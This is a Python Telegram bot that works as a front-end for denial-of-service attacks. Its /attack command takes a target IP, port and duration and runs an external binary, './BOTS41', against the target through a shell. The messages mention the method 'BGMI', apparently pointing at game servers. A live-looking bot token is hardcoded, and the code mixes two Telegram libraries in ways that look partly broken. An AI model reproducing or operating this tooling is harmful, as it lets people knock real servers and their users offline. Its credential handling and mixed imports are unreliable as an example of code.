import os
import telebot
import logging
import asyncio
from threading import Thread
from telegram.update import Update  # Fix: Corrected import
from telegram.ext import Application, CommandHandler, CallbackContext
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from pytz import timezone

# Set the timezone explicitly to a recognized one (e.g., UTC)
scheduler = AsyncIOScheduler(timezone=timezone("UTC"))

# Set up the event loop
loop = asyncio.new_event_loop()

# Your bot's token and channel ID
TOKEN = "7788814888:AAHQlW0cT2cHjwLmkr9_YCUVSn86b68rA2k"
CHANNEL_ID = -1002290907768

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)

# Define the request interval and blocked ports
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Flag to track attack status
attack_in_progress = False

# The attack function to handle attack logic
async def run_attack(chat_id, ip, port, default_duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./BOTS41 {ip} {port} {default_duration} 60",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*ERROR 🔩: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*ATTACK DONE👾*", parse_mode='Markdown')

# The function that triggers on the /attack command
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id

    # Check if the command is issued in the allowed channel
    if chat_id != CHANNEL_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to use this command.*", parse_mode='Markdown')
        return
        
    args = context.args

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*/attack ip port time*", parse_mode='Markdown')
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    if port in blocked_ports:
        await context.bot.send_message(chat_id=chat_id, text=f"🔒 Wrong {port} port", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*Attack Is Already Running Please Wait*", parse_mode='Markdown')
        return

    default_duration = 150
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*Attack Sending🪅*\n"
        f"*ip :- {ip}*\n"
        f"*port:- {port}*\n"
        f"*Time:- {default_duration}*\n"
        f"*Method :- BGMI*"
    ), parse_mode='Markdown')
    
    # Start the attack task asynchronously
    asyncio.create_task(run_attack(chat_id, ip, port, default_duration, context))

# The start function for when the bot is initialized
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("Bot is running!")

# Main function to initialize the bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("start", start))  # You can add a start command

    # Run the bot
    application.run_polling()

if __name__ == '__main__':
    # Run the main function to start the bot
    main()
